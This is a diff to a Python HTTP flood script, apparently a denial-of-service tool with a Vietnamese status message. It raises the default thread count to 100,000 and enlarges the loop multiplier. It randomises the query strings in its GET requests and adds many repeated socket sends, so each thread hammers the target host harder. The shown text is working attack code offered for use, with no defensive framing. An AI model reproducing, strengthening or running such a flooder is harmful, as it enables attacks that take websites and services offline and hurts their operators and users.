@@ -148,9 +148,9 @@ def numthreads():
     global threads
     try:
         print("-----------------------------")
-        threads = int(input(" Threads [10000]: "))
+        threads = int(input(" Threads [100000]: "))
     except ValueError:
-        threads = int(10000)
+        threads = int(100000)
         print (" Selected Threads " +str(threads)+ " [!]\n")
     logo()
     begin()
@@ -168,7 +168,7 @@ def attack():
     x     = int(0)
     error = int(0)
     req_code = int(0)
-    multiple = int(90000000000000)
+    multiple = int(9000000000000000000)
     connection = "Connection: Keep-Alive\r\n"
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
@@ -190,7 +190,7 @@ class Home(threading.Thread):
             get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
             request  = get_host + useragent + accept + content + length + "\r\n"
         else:
-            get_host = 'GET' + " /?=" +str(random.randint(10000,20000000000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
+            get_host = 'GET' + " /?=" +str(random.randint(200000000,300000000000000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
             request  = get_host + useragent + accept + referer + content + length + "\r\n"
         while True:
             try:
@@ -210,9 +210,29 @@ class Home(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
+                s.send(str.encode(request))
                 print("Đã gửi HTTP RQ by code "  " => " +str(host_url)+ ":" +str(port))
                 try:
                     for y in range(multiple):
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
+                        s.send(str.encode(request))
                         s.send(str.encode(request))
                         s.send(str.encode(request))
                         s.send(str.encode(request))
